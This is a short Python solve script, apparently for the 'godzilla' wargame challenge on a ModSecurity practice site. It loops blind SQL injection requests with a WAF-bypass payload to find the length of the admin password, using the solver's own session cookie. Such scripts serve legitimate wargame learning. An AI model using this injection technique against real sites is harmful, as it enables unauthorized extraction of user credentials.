import requests

length=0

url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?"
cookie = {"PHPSESSID":'YOUR COOKIE VALUE'} #본인의 cookie 값을 코드에 입력


for i in range(0,30):
    query = url+"pw='<@=1 or id='admin' and length(pw)="+str(i)+"%23"
    req = requests.get(query, cookies=cookie)
    print(query)

    if 'Hello admin' in req.text:
        length = i
        break

print("godzilla password length : ", length)
